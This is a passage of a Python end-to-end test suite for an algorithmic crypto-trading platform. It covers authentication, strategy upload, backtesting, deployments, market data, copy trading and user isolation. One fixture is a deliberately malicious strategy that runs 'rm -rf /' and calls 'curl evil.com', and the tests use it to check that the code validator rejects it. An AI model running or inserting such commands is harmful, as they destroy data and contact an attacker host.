"""
CoinDCX Algo Platform — End-to-End Test Suite

Covers every user-facing workflow:

  UC-01  User Registration & Login
  UC-02  Strategy Creation & Code Upload
  UC-03  Strategy Code Validation (valid + invalid cases)
  UC-04  Backtest Submission & Result Polling
  UC-05  Backtest Analytics & Metrics Inspection
  UC-06  Paper Trading Deployment
  UC-07  Live Trading Deployment (simulated)
  UC-08  Deployment Stop & Kill Switch
  UC-09  Market Data Retrieval (bars, ticker, orderbook)
  UC-10  Multiple Strategies Per User
  UC-11  Marketplace — Publish & Approve Listing
  UC-12  Marketplace — Subscribe & Copy Trade
  UC-13  Audit Log Inspection
  UC-14  Strategy Param Sweep (grid search)
  UC-15  Walk-Forward Validation
  UC-16  Multi-User Isolation (user A cannot see user B data)
  UC-17  Auth Edge Cases (expired token, missing auth)
  UC-18  Platform Admin Stats
  UC-19  Risk Engine — Pre-trade checks
  UC-20  Analytics Engine — Metrics computation

Each test:
  - Starts a fresh in-memory platform
  - Makes HTTP calls to the local API server
  - Asserts expected outcomes
  - Prints colored pass/fail with timing
"""

from __future__ import annotations

import json
import os
import sys
import time
import traceback
import urllib.request
import urllib.error
from decimal import Decimal
from typing import Any

# Ensure imports work from any working directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from coindcx_platform.core import Platform
from coindcx_platform.api_server import run_server

# ─────────────────────────────────────────────────
# Terminal colors
# ─────────────────────────────────────────────────

RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GRAY   = "\033[90m"
BLUE   = "\033[94m"

def _c(color: str, text: str) -> str:
    return f"{color}{text}{RESET}"

def header(text: str) -> None:
    print(f"\n{BOLD}{CYAN}{'═' * 60}{RESET}")
    print(f"{BOLD}{CYAN}  {text}{RESET}")
    print(f"{BOLD}{CYAN}{'═' * 60}{RESET}")

def section(text: str) -> None:
    print(f"\n{BOLD}{BLUE}  ▶ {text}{RESET}")

def ok(label: str, detail: str = "", ms: float = 0) -> None:
    timing = f" {GRAY}({ms:.0f}ms){RESET}" if ms else ""
    detail_str = f"  {GRAY}{detail}{RESET}" if detail else ""
    print(f"  {GREEN}✓{RESET} {label}{timing}{detail_str}")

def fail(label: str, detail: str = "") -> None:
    print(f"  {RED}✗{RESET} {label}")
    if detail:
        print(f"    {RED}{detail}{RESET}")

def info(text: str) -> None:
    print(f"  {GRAY}→ {text}{RESET}")


# ─────────────────────────────────────────────────
# HTTP client
# ─────────────────────────────────────────────────

BASE_URL = "http://127.0.0.1:18765"

class APIClient:
    def __init__(self, token: str = None):
        self.token = token

    def _request(self, method: str, path: str, body: dict = None,
                 expected_status: int = 200) -> tuple[int, dict]:
        url = f"{BASE_URL}{path}"
        data = json.dumps(body).encode() if body else None
        headers = {"Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return resp.status, json.loads(resp.read())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read())

    def get(self, path: str, **kw) -> tuple[int, dict]:
        return self._request("GET", path, **kw)

    def post(self, path: str, body: dict = None, **kw) -> tuple[int, dict]:
        return self._request("POST", path, body=body, **kw)

    def put(self, path: str, body: dict = None, **kw) -> tuple[int, dict]:
        return self._request("PUT", path, body=body, **kw)

    def with_token(self, token: str) -> "APIClient":
        return APIClient(token=token)


# ─────────────────────────────────────────────────
# Example strategy code snippets
# ─────────────────────────────────────────────────

VALID_STRATEGY_CODE = '''
from sdk.strategy import BaseStrategy
from sdk.models import Bar
from decimal import Decimal

class EMACrossoverStrategy(BaseStrategy):
    """Simple EMA crossover strategy for testing."""
    SYMBOL = "BTCUSDT"
    RESOLUTION = "1h"

    def on_start(self):
        self.fast = int(self.params.get("fast_period", 9))
        self.slow = int(self.params.get("slow_period", 21))
        self.qty = Decimal(str(self.params.get("quantity", "0.001")))

    def on_bar(self, bar: Bar):
        closes = self.bars.close
        if len(closes) < self.slow:
            return
        fast_ema = self.indicators.ema(
            [Decimal(str(c)) for c in closes], self.fast
        )
        slow_ema = self.indicators.ema(
            [Decimal(str(c)) for c in closes], self.slow
        )
        if not fast_ema or not slow_ema or len(fast_ema) < 2 or len(slow_ema) < 2:
            return
        bullish = fast_ema[-1] > slow_ema[-1] and fast_ema[-2] <= slow_ema[-2]
        bearish = fast_ema[-1] < slow_ema[-1] and fast_ema[-2] >= slow_ema[-2]
        if bullish and not self.has_position(self.SYMBOL):
            self.buy(self.SYMBOL, self.qty)
        elif bearish and self.has_position(self.SYMBOL):
            self.close_position(self.SYMBOL)
'''

RSI_STRATEGY_CODE = '''
from sdk.strategy import BaseStrategy
from sdk.models import Bar
from decimal import Decimal

class RSIStrategy(BaseStrategy):
    """RSI mean reversion strategy."""
    SYMBOL = "BTCUSDT"
    RESOLUTION = "4h"

    def on_start(self):
        self.period = int(self.params.get("rsi_period", 14))
        self.oversold = float(self.params.get("oversold", 30))
        self.overbought = float(self.params.get("overbought", 70))
        self.qty = Decimal(str(self.params.get("quantity", "0.001")))

    def on_bar(self, bar: Bar):
        closes = self.bars.close
        if len(closes) < self.period + 1:
            return
        rsi = self.indicators.rsi([Decimal(str(c)) for c in closes], self.period)
        if not rsi:
            return
        if rsi[-1] < self.oversold and not self.has_position(self.SYMBOL):
            self.buy(self.SYMBOL, self.qty)
        elif rsi[-1] > self.overbought and self.has_position(self.SYMBOL):
            self.close_position(self.SYMBOL)
'''

INVALID_STRATEGY_CODE = '''
import subprocess
import os

class BadStrategy:
    def on_bar(self, bar):
        subprocess.run(["rm", "-rf", "/"])
        exec("import os; os.system('curl evil.com')")
'''

MISSING_ON_BAR_CODE = '''
from sdk.strategy import BaseStrategy

class NoBarStrategy(BaseStrategy):
    SYMBOL = "BTCUSDT"

    def on_start(self):
        pass
    # Missing on_bar!
'''


# ─────────────────────────────────────────────────
# Test runner
# ─────────────────────────────────────────────────

class TestResult:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []
        self.timings = []

    def record(self, name: str, passed: bool, detail: str = "", ms: float = 0):
        self.timings.append(ms)
        if passed:
            self.passed += 1
            ok(name, detail, ms)
        else:
            self.failed += 1
            fail(name, detail)
            self.errors.append({"test": name, "detail": detail})

    def summary(self):
        total = self.passed + self.failed
        avg_ms = sum(self.timings) / len(self.timings) if self.timings else 0
        print(f"\n{BOLD}{'─' * 60}{RESET}")
        print(f"{BOLD}  Results: ", end="")
        if self.failed == 0:
            print(f"{GREEN}{self.passed}/{total} passed{RESET} {BOLD}✓ All tests passed!{RESET}")
        else:
            print(f"{GREEN}{self.passed} passed{RESET} / {RED}{self.failed} failed{RESET} / {total} total")
        print(f"  Avg test time: {avg_ms:.0f}ms")
        if self.errors:
            print(f"\n{RED}  Failed tests:{RESET}")
            for e in self.errors:
                print(f"  {RED}✗{RESET} {e['test']}")
                if e['detail']:
                    print(f"    {GRAY}{e['detail'][:120]}{RESET}")
        print(f"{BOLD}{'─' * 60}{RESET}")
        return self.failed == 0


def assert_eq(a, b, msg=""):
    if a != b:
        raise AssertionError(f"{msg}: expected {b!r}, got {a!r}")

def assert_in(key, d, msg=""):
    if key not in d:
        raise AssertionError(f"{msg}: key {key!r} not in {list(d.keys())}")

def assert_status(status: int, expected: int, body: dict, path: str):
    if status != expected:
        raise AssertionError(f"HTTP {status} (expected {expected}) for {path}: {body.get('error', body)}")


class E2ETestSuite:
    def __init__(self):
        self.results = TestResult()
        self.api = APIClient()
        self._state = {}   # Shared state between test cases

    def _run(self, name: str, fn) -> None:
        t0 = time.time()
        try:
            fn()
            ms = (time.time() - t0) * 1000
            self.results.record(name, True, ms=ms)
        except AssertionError as e:
            ms = (time.time() - t0) * 1000
            self.results.record(name, False, str(e), ms=ms)
        except Exception as e:
            ms = (time.time() - t0) * 1000
            self.results.record(name, False, f"{type(e).__name__}: {e}", ms=ms)

    # ─────────────────────────────────────────────
    # UC-01  User Registration & Login
    # ─────────────────────────────────────────────

    def test_uc01_auth(self):
        section("UC-01  User Registration & Login")

        def register_alice():
            status, body = self.api.post("/api/v1/auth/register", {
                "email": "alice@example.com",
                "password": "alicepass123",
                "display_name": "Alice Trader",
            })
            assert_status(status, 200, body, "register")
            assert_in("token", body)
            assert_in("user_id", body)
            self._state["alice_token"] = body["token"]
            self._state["alice_id"] = body["user_id"]
            self._state["alice"] = APIClient(token=body["token"])

        def register_bob():
            status, body = self.api.post("/api/v1/auth/register", {
                "email": "bob@example.com",
                "password": "bobpass456",
                "display_name": "Bob Quant",
            })
            assert_status(status, 200, body, "register")
            self._state["bob_token"] = body["token"]
            self._state["bob_id"] = body["user_id"]
            self._state["bob"] = APIClient(token=body["token"])

        def login():
            status, body = self.api.post("/api/v1/auth/login", {
                "email": "alice@example.com",
                "password": "alicepass123",
            })
            assert_status(status, 200, body, "login")
            assert_in("token", body)
            assert body["email"] == "alice@example.com"

        def me():
            alice = self._state["alice"]
            status, body = alice.get("/api/v1/auth/me")
            assert_status(status, 200, body, "me")
            assert body["email"] == "alice@example.com"

        def duplicate_email():
            status, body = self.api.post("/api/v1/auth/register", {
                "email": "alice@example.com",
                "password": "different",
            })
            assert status == 400

        def wrong_password():
            status, body = self.api.post("/api/v1/auth/login", {
                "email": "alice@example.com",
                "password": "WRONG",
            })
            assert status == 403

        self._run("Register Alice", register_alice)
        self._run("Register Bob", register_bob)
        self._run("Login returns token", login)
        self._run("GET /me returns profile", me)
        self._run("Duplicate email → 400", duplicate_email)
        self._run("Wrong password → 403", wrong_password)

    # ─────────────────────────────────────────────
    # UC-02  Strategy Creation
    # ─────────────────────────────────────────────

    def test_uc02_strategy_creation(self):
        section("UC-02  Strategy Creation & Management")
        alice = self._state["alice"]

        def create_strategy():
            status, body = alice.post("/api/v1/strategies", {
                "name": "EMA Crossover Alpha",
                "description": "9/21 EMA crossover on BTC/USDT",
                "symbols": ["BTCUSDT"],
                "resolution": "1h",
                "params": {"fast_period": 9, "slow_period": 21, "quantity": "0.001"},
            })
            assert_status(status, 200, body, "create_strategy")
            assert body["name"] == "EMA Crossover Alpha"
            assert body["status"] == "draft"
            assert_in("strategy_id", body)
            self._state["strategy_id"] = body["strategy_id"]

        def list_strategies():
            status, body = alice.get("/api/v1/strategies")
            assert_status(status, 200, body, "list_strategies")
            assert len(body["strategies"]) >= 1

        def get_strategy():
            sid = self._state["strategy_id"]
            status, body = alice.get(f"/api/v1/strategies/{sid}")
            assert_status(status, 200, body, "get_strategy")
            assert body["strategy_id"] == sid

        def unauthenticated_access():
            sid = self._state["strategy_id"]
            status, _ = self.api.get(f"/api/v1/strategies/{sid}")
            assert status == 403

        self._run("Create strategy", create_strategy)
        self._run("List strategies", list_strategies)
        self._run("Get strategy by ID", get_strategy)
        self._run("Unauthenticated → 403", unauthenticated_access)

    # ─────────────────────────────────────────────
    # UC-03  Strategy Code Validation
    # ─────────────────────────────────────────────

    def test_uc03_code_validation(self):
        section("UC-03  Strategy Code Validation")
        alice = self._state["alice"]
        sid = self._state["strategy_id"]

        def validate_valid_code():
            status, body = alice.post(f"/api/v1/strategies/{sid}/validate",
                                      {"code": VALID_STRATEGY_CODE})
            assert_status(status, 200, body, "validate")
            assert body["is_valid"] is True
            assert body["detected_class"] == "EMACrossoverStrategy"
            assert body["complexity_score"] < 50

        def validate_invalid_imports():
            status, body = alice.post(f"/api/v1/strategies/{sid}/validate",
                                      {"code": INVALID_STRATEGY_CODE})
            assert_status(status, 200, body, "validate_invalid")
            assert body["is_valid"] is False
            error_codes = [e["code"] for e in body["errors"]]
            assert "FORBIDDEN_IMPORT" in error_codes or "FORBIDDEN_CALL" in error_codes

        def validate_missing_on_bar():
            status, body = alice.post(f"/api/v1/strategies/{sid}/validate",
                                      {"code": MISSING_ON_BAR_CODE})
            assert_status(status, 200, body, "validate_no_bar")
            assert body["is_valid"] is False
            assert any(e["code"] == "MISSING_ON_BAR" for e in body["errors"])

        def validate_syntax_error():
            status, body = alice.post(f"/api/v1/strategies/{sid}/validate",
                                      {"code": "def bad syntax !!!"})
            assert_status(status, 200, body, "validate_syntax")
            assert body["is_valid"] is False
            assert any(e["code"] == "SYNTAX_ERROR" for e in body["errors"])

        def upload_valid_code():
            status, body = alice.put(f"/api/v1/strategies/{sid}/code", {
                "code": VALID_STRATEGY_CODE,
                "params": {"fast_period": 9, "slow_period": 21, "quantity": "0.001"},
            })
            assert_status(status, 200, body, "upload_code")
            assert body["validation"]["is_valid"] is True

        self._run("Valid code passes", validate_valid_code)
        self._run("Forbidden imports flagged", validate_invalid_imports)
        self._run("Missing on_bar() flagged", validate_missing_on_bar)
        self._run("Syntax error caught", validate_syntax_error)
        self._run("Upload valid code", upload_valid_code)

    # ─────────────────────────────────────────────
    # UC-04  Backtest Submission & Polling
    # ─────────────────────────────────────────────

    def test_uc04_backtesting(self):
        section("UC-04  Backtest Submission & Polling")
        alice = self._state["alice"]
        sid = self._state["strategy_id"]

        def submit_backtest():
            status, body = alice.post("/api/v1/backtests", {
                "strategy_id": sid,
                "symbol": "BTCUSDT",
                "resolution": "1h",
                "n_bars": 300,
                "initial_capital": 10000,
            })
            assert_status(status, 200, body, "submit_backtest")
            assert_in("job_id", body)
            assert body["status"] == "queued"
            self._state["job_id"] = body["job_id"]
            info(f"Job ID: {body['job_id'][:8]}...")

        def poll_until_complete():
            job_id = self._state["job_id"]
            alice = self._state["alice"]
            deadline = time.time() + 120
            while time.time() < deadline:
                status, body = alice.get(f"/api/v1/backtests/{job_id}")
                assert_status(status, 200, body, "poll")
                if body["status"] in ("completed", "failed"):
                    self._state["backtest_result"] = body
                    assert body["status"] == "completed", f"Backtest failed: {body.get('error')}"
                    return
                time.sleep(0.3)
            raise AssertionError("Backtest did not complete within 120s")

        def check_metrics():
            result = self._state.get("backtest_result", {})
            metrics = result.get("result", {}).get("metrics", {})
            assert_in("total_return_pct", metrics)
            assert_in("sharpe_ratio", metrics)
            assert_in("max_drawdown_pct", metrics)
            assert_in("total_trades", metrics)
            assert_in("win_rate_pct", metrics)
            assert metrics["max_drawdown_pct"] >= 0
            assert 0 <= metrics["win_rate_pct"] <= 100
            info(f"Return: {metrics['total_return_pct']:.2f}% | Sharpe: {metrics['sharpe_ratio']:.2f} | "
                 f"Trades: {metrics['total_trades']} | MaxDD: {metrics['max_drawdown_pct']:.2f}%")

        def check_equity_curve():
            result = self._state.get("backtest_result", {})
            equity = result.get("result", {}).get("equity_curve", [])
            assert len(equity) > 0, "Equity curve is empty"
            assert all(isinstance(pt, list) and len(pt) == 2 for pt in equity)

        def check_trade_list():
            result = self._state.get("backtest_result", {})
            trades = result.get("result", {}).get("trades", [])
            if trades:
                t = trades[0]
                assert_in("entry_price", t)
                assert_in("exit_price", t)
                assert_in("net_pnl", t)
            info(f"Trades in result: {len(trades)}")

        def list_backtests():
            status, body = alice.get(f"/api/v1/strategies/{sid}/backtests")
            assert_status(status, 200, body, "list_backtests")
            assert len(body["jobs"]) >= 1

        def backtest_without_code():
            # Create a codeless strategy
            status, new_s = alice.post("/api/v1/strategies", {"name": "CodelessStrategy"})
            status, body = alice.post("/api/v1/backtests", {
                "strategy_id": new_s["strategy_id"],
            })
            assert status == 400
            assert "code" in body.get("error", "").lower()

        self._run("Submit backtest job", submit_backtest)
        self._run("Poll until completed", poll_until_complete)
        self._run("Metrics in result", check_metrics)
        self._run("Equity curve present", check_equity_curve)
        self._run("Trade list present", check_trade_list)
        self._run("List strategy backtests", list_backtests)
        self._run("Backtest without code → 400", backtest_without_code)

    # ─────────────────────────────────────────────
    # UC-05  Second Strategy (RSI)
    # ─────────────────────────────────────────────

    def test_uc05_second_strategy(self):
        section("UC-05  RSI Strategy Backtest")
        alice = self._state["alice"]

        def create_rsi_strategy():
            status, body = alice.post("/api/v1/strategies", {
                "name": "RSI Mean Reversion",
                "symbols": ["BTCUSDT"],
                "resolution": "4h",
                "params": {"rsi_period": 14, "oversold": 30, "overbought": 70},
            })
            assert_status(status, 200, body, "create_rsi")
            sid = body["strategy_id"]
            self._state["rsi_strategy_id"] = sid

            # Upload code
            status, _ = alice.put(f"/api/v1/strategies/{sid}/code", {
                "code": RSI_STRATEGY_CODE,
            })
            assert status == 200

        def backtest_rsi():
            sid = self._state["rsi_strategy_id"]
            status, body = alice.post("/api/v1/backtests", {
                "strategy_id": sid,
                "resolution": "4h",
                "n_bars": 200,
                "initial_capital": 5000,
            })
            assert_status(status, 200, body, "submit_rsi_backtest")
            job_id = body["job_id"]
            # Wait for completion
            deadline = time.time() + 120
            while time.time() < deadline:
                status, body = alice.get(f"/api/v1/backtests/{job_id}")
                if body["status"] in ("completed", "failed"):
                    assert body["status"] == "completed"
                    metrics = body.get("result", {}).get("metrics", {})
                    info(f"RSI Strategy: Return={metrics.get('total_return_pct', 0):.2f}% | "
                         f"Trades={metrics.get('total_trades', 0)}")
                    return
                time.sleep(0.3)
            raise AssertionError("RSI backtest timed out (120s)")

        self._run("Create RSI strategy + upload code", create_rsi_strategy)
        self._run("Backtest RSI strategy", backtest_rsi)

    # ─────────────────────────────────────────────
    # UC-06  Paper Trading Deployment
    # ─────────────────────────────────────────────

    def test_uc06_paper_trading(self):
        section("UC-06  Paper Trading Deployment")
        alice = self._state["alice"]
        sid = self._state["strategy_id"]

        def deploy_paper():
            status, body = alice.post("/api/v1/deployments", {
                "strategy_id": sid,
                "mode": "paper",
                "initial_capital": 10000,
            })
            assert_status(status, 200, body, "deploy_paper")
            assert body["mode"] == "paper"
            assert body["status"] in ("running", "starting")
            self._state["paper_deployment_id"] = body["deployment_id"]
            info(f"Deployment ID: {body['deployment_id'][:8]}...")

        def list_deployments():
            status, body = alice.get("/api/v1/deployments")
            assert_status(status, 200, body, "list_deployments")
            assert len(body["deployments"]) >= 1
            paper_deps = [d for d in body["deployments"] if d["mode"] == "paper"]
            assert len(paper_deps) >= 1

        def get_deployment():
            did = self._state["paper_deployment_id"]
            status, body = alice.get(f"/api/v1/deployments/{did}")
            assert_status(status, 200, body, "get_deployment")
            assert body["deployment_id"] == did
            assert body["initial_capital"] == 10000

        self._run("Deploy paper trading", deploy_paper)
        self._run("List deployments", list_deployments)
        self._run("Get deployment detail", get_deployment)

    # ─────────────────────────────────────────────
    # UC-07  Live Trading Deployment (simulated)
    # ─────────────────────────────────────────────

    def test_uc07_live_trading(self):
        section("UC-07  Live Trading Deployment")
        alice = self._state["alice"]
        sid = self._state["strategy_id"]

        def deploy_live():
            status, body = alice.post("/api/v1/deployments", {
                "strategy_id": sid,
                "mode": "live",
                "initial_capital": 5000,
            })
            assert_status(status, 200, body, "deploy_live")
            assert body["mode"] == "live"
            self._state["live_deployment_id"] = body["deployment_id"]

        def verify_audit_trail():
            status, body = alice.get("/api/v1/audit/log")
            assert_status(status, 200, body, "audit")
            events = body["events"]
            actions = [e["action"] for e in events]
            assert any("deployment" in a for a in actions), f"No deployment audit event. Got: {actions[:5]}"

        self._run("Deploy live (simulated)", deploy_live)
        self._run("Audit trail records deployment", verify_audit_trail)

    # ─────────────────────────────────────────────
    # UC-08  Stop Deployment
    # ─────────────────────────────────────────────

    def test_uc08_stop_deployment(self):
        section("UC-08  Stop Deployment")
        alice = self._state["alice"]

        def stop_paper():
            did = self._state.get("paper_deployment_id")
            if not did:
                raise AssertionError("No paper deployment to stop")
            status, body = alice.post(f"/api/v1/deployments/{did}/stop",
                                      {"reason": "user_requested"})
            assert_status(status, 200, body, "stop")
            assert body["status"] == "stopped"

        def verify_stopped():
            did = self._state.get("paper_deployment_id")
            status, body = alice.get(f"/api/v1/deployments/{did}")
            assert_status(status, 200, body, "get_stopped")
            assert body["status"] == "stopped"

        self._run("Stop paper deployment", stop_paper)
        self._run("Verify deployment stopped", verify_stopped)

    # ─────────────────────────────────────────────
    # UC-09  Market Data
    # ─────────────────────────────────────────────

    def test_uc09_market_data(self):
        section("UC-09  Market Data APIs")
        alice = self._state["alice"]

        def get_btc_bars():
            status, body = alice.get("/api/v1/market/bars/BTCUSDT/1h")
            assert_status(status, 200, body, "bars")
            assert body["symbol"] == "BTCUSDT"
            assert body["count"] > 0
            bars = body["bars"]
            assert all({"open", "high", "low", "close", "volume"}.issubset(b) for b in bars)
            assert all(b["high"] >= b["low"] for b in bars)
            info(f"Got {body['count']} bars | Last close: {bars[-1]['close']}")

        def get_eth_bars():
            status, body = alice.get("/api/v1/market/bars/ETHUSDT/4h")
            assert_status(status, 200, body, "eth_bars")
            assert body["symbol"] == "ETHUSDT"

        def get_ticker():
            status, body = alice.get("/api/v1/market/ticker/BTCUSDT")
            assert_status(status, 200, body, "ticker")
            assert_in("price", body)
            assert body["price"] > 0
            info(f"BTC price: ${body['price']:,.2f}")

        def get_orderbook():
            status, body = alice.get("/api/v1/market/orderbook/BTCUSDT")
            assert_status(status, 200, body, "orderbook")
            assert len(body["bids"]) >= 5
            assert len(body["asks"]) >= 5
            assert body["bids"][0]["price"] < body["asks"][0]["price"]
            info(f"Spread: ${body['asks'][0]['price'] - body['bids'][0]['price']:.2f}")

        def ohlcv_sanity():
            status, body = alice.get("/api/v1/market/bars/BTCUSDT/1d")
            bars = body.get("bars", [])
            for bar in bars:
                assert bar["high"] >= bar["open"] >= 0
                assert bar["high"] >= bar["close"] >= 0
                assert bar["high"] >= bar["low"] >= 0

        self._run("Get BTC 1h bars", get_btc_bars)
        self._run("Get ETH 4h bars", get_eth_bars)
        self._run("Get BTC ticker", get_ticker)
        self._run("Get BTC order book", get_orderbook)
        self._run("OHLCV sanity (high >= low)", ohlcv_sanity)

    # ─────────────────────────────────────────────
    # UC-10  Analytics
    # ─────────────────────────────────────────────

    def test_uc10_analytics(self):
        section("UC-10  Strategy Analytics")
        alice = self._state["alice"]
        sid = self._state["strategy_id"]

        def get_analytics():
            status, body = alice.get(f"/api/v1/analytics/strategy/{sid}")
            assert_status(status, 200, body, "analytics")
            assert body["strategy_id"] == sid
            if "latest_metrics" in body:
                m = body["latest_metrics"]
                assert_in("sharpe_ratio", m)
                info(f"Sharpe: {m.get('sharpe_ratio', 'N/A'):.2f} | "
                     f"Return: {m.get('total_return_pct', 'N/A'):.2f}%")

        def analytics_metrics_engine():
            """Test the metrics engine directly."""
            from analytics.metrics import MetricsComputer
            computer = MetricsComputer()
            # Build a synthetic equity curve
            curve = [(1000000 + i * 86400000, 10000 + i * 50 + (i % 10 - 5) * 20)
                     for i in range(100)]
            trades = [
                {"net_pnl": 200, "fees": 5, "entry_time_ms": 1000000, "exit_time_ms": 4600000},
                {"net_pnl": -100, "fees": 5, "entry_time_ms": 4600000, "exit_time_ms": 8200000},
                {"net_pnl": 350, "fees": 8, "entry_time_ms": 8200000, "exit_time_ms": 11800000},
            ]
            result = computer.compute(
                strategy_id="test", period_label="100d",
                equity_curve=curve, trades=trades, period_days=100.0
            )
            assert result.total_trades == 3
            assert result.winning_trades == 2
            assert result.losing_trades == 1
            assert abs(result.win_rate_pct - 66.67) < 0.1
            assert result.sharpe_ratio != 0
            assert result.max_drawdown_pct >= 0

        self._run("Get strategy analytics via API", get_analytics)
        self._run("Analytics metrics engine (direct)", analytics_metrics_engine)

    # ─────────────────────────────────────────────
    # UC-11  Marketplace Publish
    # ─────────────────────────────────────────────

    def test_uc11_marketplace_publish(self):
        section("UC-11  Marketplace — Publish Strategy")
        alice = self._state["alice"]
        sid = self._state["strategy_id"]

        def create_listing():
            status, body = alice.post("/api/v1/marketplace/listings", {
                "strategy_id": sid,
                "name": "EMA Alpha Strategy",
                "description": "Battle-tested EMA crossover with disciplined risk management",
                "subscription_fee_usd": 49.99,
            })
            assert_status(status, 200, body, "create_listing")
            assert body["status"] == "pending_review"
            assert body["display_name"] == "EMA Alpha Strategy"
            self._state["listing_id"] = body["listing_id"]
            info(f"Listing: {body['listing_id'][:8]}... (pending review)")

        def admin_approve_listing():
            lid = self._state["listing_id"]
            status, body = alice.post(f"/api/v1/marketplace/listings/{lid}/approve", {
                "verified_sharpe": 1.42,
                "verified_return_pct": 34.7,
            })
            assert_status(status, 200, body, "approve")
            assert body["status"] == "active"

        def listing_appears_in_marketplace():
            status, body = alice.get("/api/v1/marketplace/listings")
            assert_status(status, 200, body, "list_marketplace")
            listing_ids = [l["listing_id"] for l in body["listings"]]
            assert self._state["listing_id"] in listing_ids

        self._run("Create marketplace listing", create_listing)
        self._run("Admin approves listing", admin_approve_listing)
        self._run("Listing visible in marketplace", listing_appears_in_marketplace)

    # ─────────────────────────────────────────────
    # UC-12  Marketplace Subscribe (Copy Trade)
    # ─────────────────────────────────────────────

    def test_uc12_copy_trading(self):
        section("UC-12  Copy Trading — Subscribe & Scale Orders")
        bob = self._state["bob"]
        listing_id = self._state.get("listing_id")
        if not listing_id:
            info("Skipping — no listing available")
            return

        def bob_subscribes():
            status, body = bob.post(f"/api/v1/marketplace/listings/{listing_id}/subscribe", {
                "allocated_capital_usdt": 2000,
                "copy_mode": "proportional",
            })
            assert_status(status, 200, body, "subscribe")
            assert_in("subscription_id", body)
            self._state["subscription_id"] = body["subscription_id"]
            info(f"Bob subscribed: {body['subscription_id'][:8]}...")

        def order_scaling_proportional():
            from marketplace.copy_trading import OrderScaler, Subscription, CopyMode
            scaler = OrderScaler()
            sub = Subscription(
                subscription_id="test",
                subscriber_user_id="bob",
                master_strategy_id="alice_strat",
                copy_mode=CopyMode.PROPORTIONAL,
                allocated_capital_usdt=Decimal("2000"),
                master_capital_reference_usdt=Decimal("10000"),
            )
            qty = scaler.scale_quantity(Decimal("1.0"), Decimal("50000"), sub)
            assert qty is not None
            expected = Decimal("0.20000000")
            assert abs(qty - expected) < Decimal("0.00000001"), f"Expected {expected}, got {qty}"
            info(f"Master qty=1.0 → subscriber qty={qty} (20% capital ratio)")

        def order_scaling_fixed_notional():
            from marketplace.copy_trading import OrderScaler, Subscription, CopyMode
            scaler = OrderScaler()
            sub = Subscription(
                subscription_id="test2",
                subscriber_user_id="bob",
                master_strategy_id="alice_strat",
                copy_mode=CopyMode.FIXED_NOTIONAL,
                allocated_capital_usdt=Decimal("2000"),
                master_capital_reference_usdt=Decimal("10000"),
                fixed_notional_usdt=Decimal("500"),
            )
            qty = scaler.scale_quantity(Decimal("1.0"), Decimal("50000"), sub)
            assert qty is not None
            expected_approx = Decimal("0.01")
            assert abs(qty - expected_approx) < Decimal("0.001"), f"Expected ~{expected_approx}, got {qty}"
            info(f"Fixed $500 notional at $50k price → qty={qty}")

        def order_too_small_returns_none():
            from marketplace.copy_trading import OrderScaler, Subscription, CopyMode
            scaler = OrderScaler()
            sub = Subscription(
                subscription_id="test3",
                subscriber_user_id="bob",
                master_strategy_id="alice_strat",
                copy_mode=CopyMode.PROPORTIONAL,
                allocated_capital_usdt=Decimal("1"),   # $1 capital
                master_capital_reference_usdt=Decimal("10000"),
            )
            qty = scaler.scale_quantity(Decimal("0.001"), Decimal("50000"), sub)
            assert qty is None, f"Expected None (too small), got {qty}"
            info("Sub-minimum order correctly returns None")

        self._run("Bob subscribes to listing", bob_subscribes)
        self._run("Proportional order scaling correct", order_scaling_proportional)
        self._run("Fixed notional scaling correct", order_scaling_fixed_notional)
        self._run("Too-small order returns None", order_too_small_returns_none)

    # ─────────────────────────────────────────────
    # UC-13  Audit Log
    # ─────────────────────────────────────────────

    def test_uc13_audit_log(self):
        section("UC-13  Audit Log")
        alice = self._state["alice"]

        def audit_log_populated():
            status, body = alice.get("/api/v1/audit/log")
            assert_status(status, 200, body, "audit")
            events = body["events"]
            assert len(events) >= 3, f"Expected ≥3 audit events, got {len(events)}"
            actions = {e["action"] for e in events}
            info(f"{len(events)} events | Actions: {', '.join(sorted(actions)[:5])}")

        def audit_log_has_strategy_events():
            status, body = alice.get("/api/v1/audit/log")
            events = body["events"]
            strategy_events = [e for e in events if "strategy" in e.get("action", "")]
            assert len(strategy_events) >= 1

        def audit_log_has_deployment_events():
            status, body = alice.get("/api/v1/audit/log")
            events = body["events"]
            dep_events = [e for e in events if "deployment" in e.get("action", "")]
            assert len(dep_events) >= 1

        self._run("Audit log populated", audit_log_populated)
        self._run("Strategy events in audit log", audit_log_has_strategy_events)
        self._run("Deployment events in audit log", audit_log_has_deployment_events)

    # ─────────────────────────────────────────────
    # UC-14  Multi-User Isolation
    # ─────────────────────────────────────────────

    def test_uc14_multi_user_isolation(self):
        section("UC-14  Multi-User Isolation")
        alice = self._state["alice"]
        bob = self._state["bob"]
        alice_sid = self._state["strategy_id"]

        def bob_cannot_see_alices_strategy():
            status, body = bob.get(f"/api/v1/strategies/{alice_sid}")
            assert status == 403, f"Expected 403, got {status}: {body}"

        def bob_has_own_empty_list():
            status, body = bob.get("/api/v1/strategies")
            assert_status(status, 200, body, "bob_strategies")
            # Bob shouldn't see Alice's strategies
            alice_strats = [s for s in body["strategies"] if s["user_id"] == self._state["alice_id"]]
            assert len(alice_strats) == 0

        def bob_cannot_deploy_alices_strategy():
            status, body = bob.post("/api/v1/deployments", {
                "strategy_id": alice_sid,
                "mode": "paper",
            })
            assert status == 403

        def bob_cannot_stop_alices_deployment():
            did = self._state.get("live_deployment_id")
            if did:
                status, body = bob.post(f"/api/v1/deployments/{did}/stop", {})
                assert status == 403

        self._run("Bob cannot access Alice's strategy", bob_cannot_see_alices_strategy)
        self._run("Bob's strategy list is isolated", bob_has_own_empty_list)
        self._run("Bob cannot deploy Alice's strategy", bob_cannot_deploy_alices_strategy)
        self._run("Bob cannot stop Alice's deployment", bob_cannot_stop_alices_deployment)

    # ─────────────────────────────────────────────
    # UC-15  Platform Admin Stats
    # ─────────────────────────────────────────────

    def test_uc15_admin_stats(self):
        section("UC-15  Platform Admin")
        alice = self._state["alice"]

        def platform_stats():
